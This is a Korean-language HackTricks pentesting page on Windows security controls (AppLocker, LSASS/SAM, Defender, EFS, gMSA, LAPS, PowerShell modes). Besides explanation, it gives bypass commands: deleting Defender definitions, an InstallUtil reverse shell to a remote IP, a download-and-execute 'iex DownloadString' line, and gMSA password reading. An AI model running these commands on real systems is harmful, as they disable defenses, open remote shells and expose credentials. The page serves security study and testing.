# Windows Security Controls

{{#include ../banners/hacktricks-training.md}}

## AppLocker Policy

애플리케이션 whitelist는 시스템에 존재하고 실행할 수 있도록 승인된 software application 또는 executable 목록입니다. 그 목적은 조직의 특정 비즈니스 요구 사항에 부합하지 않는 유해한 malware와 승인되지 않은 software로부터 환경을 보호하는 것입니다.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker)는 Microsoft의 **application whitelisting solution**이며, 시스템 관리자가 **사용자가 실행할 수 있는 application과 file**을 제어할 수 있도록 합니다. executable, script, Windows installer file, DLL, packaged app 및 packed app installer에 대해 **세부적인 제어**를 제공합니다.\
조직에서는 **cmd.exe와 PowerShell.exe를 차단**하고 특정 directory에 대한 write access를 제한하는 것이 일반적이지만, **이 모든 것은 우회할 수 있습니다**.

### Check

blacklist/whitelist된 file 및 extension 확인:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
이 레지스트리 경로에는 AppLocker에서 적용하는 구성과 정책이 포함되어 있으며, 시스템에서 현재 적용 중인 규칙 집합을 검토할 수 있습니다:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policy를 bypass하는 데 유용한 **Writable folders**: AppLocker가 `C:\Windows\System32` 또는 `C:\Windows` 내부의 모든 항목 실행을 허용하는 경우, 이를 **bypass**하는 데 사용할 수 있는 **writable folders**가 있습니다.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- 일반적으로 **trusted**한 [**"LOLBAS's"**](https://lolbas-project.github.io/) 바이너리도 AppLocker를 우회하는 데 유용할 수 있습니다.
- **잘못 작성된 rule도 우회할 수 있습니다.**
- 예를 들어 **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**의 경우, 어디에든 **`allowed`라는 폴더를 생성**하면 허용됩니다.
- 조직에서는 **`%System32%\WindowsPowerShell\v1.0\powershell.exe` 실행 파일을 차단**하는 데 집중하는 경우가 많지만, `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` 또는 `PowerShell_ISE.exe`와 같은 **다른** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)을 잊곤 합니다.
- 시스템에 추가적인 부하를 줄 수 있고 아무것도 손상되지 않도록 하기 위해 많은 테스트가 필요하므로 **DLL enforcement는 거의 활성화되지 않습니다.** 따라서 **DLL을 backdoor로 사용하면 AppLocker 우회에 도움이 됩니다.**
- [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 또는 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)을 사용하여 모든 process에서 **Powershell** code를 **execute**하고 AppLocker를 우회할 수 있습니다. 자세한 내용은 다음을 참고하세요: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

이 파일에는 로컬 credentials가 있으며, password는 hash 처리되어 있습니다.

### Local Security Authority (LSA) - LSASS

Single Sign-On을 위해 이 subsystem의 **memory**에 **credentials**(hashed)가 **저장**됩니다.\
**LSA**는 로컬 **security policy**(password policy, users permissions...), **authentication**, **access tokens** 등을 관리합니다.\
LSA는 **SAM** 파일 내부에서 제공된 credentials를 **확인**(로컬 login의 경우)하고, domain user를 인증하기 위해 **domain controller**와 **통신**합니다.

**credentials**는 **process LSASS** 내부에 저장됩니다: Kerberos tickets, NT 및 LM hashes, 쉽게 decrypt할 수 있는 passwords가 저장됩니다.

### LSA secrets

LSA는 일부 credentials를 disk에 저장할 수 있습니다:

- Active Directory의 computer account password (연결할 수 없는 domain controller).
- Windows services account의 passwords
- scheduled tasks의 passwords
- 기타 (IIS applications의 password...)

### NTDS.dit

Active Directory의 database입니다. Domain Controllers에만 존재합니다.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender)는 Windows 10 및 Windows 11과 Windows Server 버전에서 사용할 수 있는 Antivirus입니다. **`WinPEAS`**와 같은 일반적인 pentesting tools를 **block**합니다. 그러나 이러한 **protections를 우회하는 방법**이 있습니다.

### Check

**Defender**의 **status**를 확인하려면 PS cmdlet **`Get-MpComputerStatus`**를 execute할 수 있습니다(**`RealTimeProtectionEnabled`**의 값을 확인하여 active 상태인지 알 수 있습니다):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

이를 enumerate하려면 다음도 실행할 수 있습니다:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS는 **File Encryption Key (FEK)**로 알려진 **대칭 키**를 사용하여 파일을 암호화함으로써 파일을 보호합니다. 이 키는 사용자의 **public key**로 암호화되어 암호화된 파일의 $EFS **alternative data stream**에 저장됩니다. 복호화가 필요할 때는 사용자의 digital certificate에 해당하는 **private key**를 사용하여 $EFS stream에서 FEK를 복호화합니다. 자세한 내용은 [여기](https://en.wikipedia.org/wiki/Encrypting_File_System)에서 확인할 수 있습니다.

**사용자의 작업 없이 발생하는 복호화 시나리오**는 다음과 같습니다:

- 파일이나 폴더를 [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table)와 같은 non-EFS file system으로 이동하면 자동으로 복호화됩니다.
- SMB/CIFS protocol을 통해 network로 전송되는 encrypted file은 전송 전에 복호화됩니다.

이 encryption method를 사용하면 소유자가 encrypted file에 **transparent access**할 수 있습니다. 그러나 단순히 소유자의 password를 변경하고 로그인하는 것만으로는 복호화할 수 없습니다.

**Key Takeaways**:

- EFS는 사용자의 public key로 암호화된 symmetric FEK를 사용합니다.
- 복호화에는 FEK에 액세스하기 위한 사용자의 private key가 사용됩니다.
- FAT32로 복사하거나 network로 전송하는 경우처럼 특정 조건에서 automatic decryption이 발생합니다.
- 소유자는 추가 작업 없이 encrypted file에 액세스할 수 있습니다.

### EFS 정보 확인

**user**가 이 **service**를 **사용한** 적이 있는지 다음 path가 존재하는지 확인합니다:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

cipher /c \<file>\을 사용하여 파일에 **access**할 수 있는 **사용자**를 확인합니다.  
또한 폴더 내부에서 `cipher /e` 및 `cipher /d`를 사용하여 모든 파일을 **encrypt** 및 **decrypt**할 수 있습니다.

### EFS 파일 복호화

#### Being Authority System

이 방법을 사용하려면 **victim user**가 host 내부에서 **process**를 **실행 중**이어야 합니다. 그런 경우 `meterpreter` sessions를 사용하여 해당 사용자의 process token을 impersonate할 수 있습니다(`incognito`의 `impersonate_token`). 또는 해당 사용자의 process로 `migrate`할 수도 있습니다.

#### 사용자의 password를 알고 있는 경우

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft는 IT infrastructure에서 service account 관리를 간소화하기 위해 **Group Managed Service Accounts (gMSA)**를 개발했습니다. "**Password never expire**" setting이 활성화된 경우가 많은 기존 service account와 달리, gMSA는 더욱 안전하고 관리하기 쉬운 solution을 제공합니다:

- **Automatic Password Management**: gMSA는 240-character의 복잡한 password를 사용하며, domain 또는 computer policy에 따라 자동으로 변경됩니다. 이 process는 Microsoft의 Key Distribution Service (KDC)가 처리하므로 수동으로 password를 업데이트할 필요가 없습니다.
- **Enhanced Security**: 이러한 account는 lockout의 영향을 받지 않으며 interactive login에 사용할 수 없어 security가 향상됩니다.
- **Multiple Host Support**: gMSA는 여러 host에서 공유할 수 있으므로 여러 server에서 실행되는 service에 적합합니다.
- **Scheduled Task Capability**: managed service account와 달리 gMSA는 scheduled task 실행을 지원합니다.
- **Simplified SPN Management**: computer의 sAMaccount detail 또는 DNS name이 변경되면 system이 Service Principal Name (SPN)을 자동으로 업데이트하므로 SPN 관리가 간소화됩니다.

gMSA의 password는 LDAP property _**msDS-ManagedPassword**_에 저장되며 Domain Controller (DC)가 30일마다 자동으로 reset합니다. [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)로 알려진 encrypted data blob인 이 password는 authorized administrator와 gMSA가 설치된 server만 retrieve할 수 있어 secure environment를 보장합니다. 이 정보에 액세스하려면 LDAPS와 같은 secured connection이 필요하거나 connection이 'Sealing & Secure'로 authenticated되어야 합니다.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

[**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**를 사용하여 이 password를 읽을 수 있습니다.
```
/GMSAPasswordReader --AccountName jkohler
```
[**이 게시물에서 더 많은 정보 확인**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

또한 **NTLM relay attack**을 수행하여 **gMSA**의 **password**를 **read**하는 방법은 이 [web page](https://cube0x0.github.io/Relaying-for-gMSA/)를 확인하세요.<sup>[[3]](#references)</sup>

## LAPS

[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899)에서 다운로드할 수 있는 **Local Administrator Password Solution (LAPS)**은 로컬 Administrator password를 관리할 수 있도록 합니다. **randomized**되고 고유하며 **정기적으로 변경**되는 이러한 password는 Active Directory에 중앙에서 저장됩니다. 이러한 password에 대한 접근은 ACL을 통해 권한이 부여된 사용자로 제한됩니다. 충분한 권한이 부여되면 로컬 admin password를 read할 수 있습니다.

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)는 PowerShell을 효과적으로 사용하는 데 필요한 많은 기능을 **제한**합니다. 예를 들어 COM objects를 차단하고, 승인된 .NET types만 허용하며, XAML-based workflows와 PowerShell classes 등을 제한합니다.

### **확인**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
현재 Windows에서는 해당 Bypass가 작동하지 않지만 [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)을 사용할 수 있습니다.\
**컴파일하려면** _**참조 추가**_ -> _찾아보기_ -> _찾아보기_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll`을 추가하고 **프로젝트를 .Net4.5로 변경해야 할 수 있습니다**.

#### 직접 우회:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 또는 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)을 사용하여 모든 프로세스에서 **Powershell** 코드를 실행하고 constrained mode를 우회할 수 있습니다. 자세한 내용은 다음을 참고하세요: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## PS Execution Policy

기본적으로 **restricted**로 설정되어 있습니다. 이 정책을 우회하는 주요 방법은 다음과 같습니다:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

사용자 인증에 사용할 수 있는 API입니다.

SSPI는 통신하려는 두 시스템에 적합한 프로토콜을 찾는 역할을 담당합니다. 이때 선호되는 방식은 Kerberos입니다. 그런 다음 SSPI는 사용할 인증 프로토콜을 협상합니다. 이러한 인증 프로토콜을 Security Support Provider (SSP)라고 하며, 각 Windows 시스템 내부에 DLL 형태로 존재합니다. 통신하려면 두 시스템이 동일한 SSP를 지원해야 합니다.

### Main SSPs

- **Kerberos**: 선호되는 방식
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** 및 **NTLMv2**: 호환성을 위한 방식
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web 서버 및 LDAP에서 사용되며, 비밀번호는 MD5 hash 형태
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL 및 TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: 사용할 프로토콜을 협상하는 데 사용됨(Kerberos 또는 NTLM이며, 기본값은 Kerberos)
- %windir%\Windows\System32\lsasrv.dll

#### 협상 과정에서 여러 가지 방식 또는 하나의 방식만 제시될 수 있습니다.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)은 **권한 상승 작업에 대한 동의 프롬프트**를 활성화하는 기능입니다.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## References

- [1] [Bypassing Applocker and Powershell contstrained language mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [2] [howto ~ decrypt EFS files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying for gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 Ways to Bypass the PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

{{#include ../banners/hacktricks-training.md}}
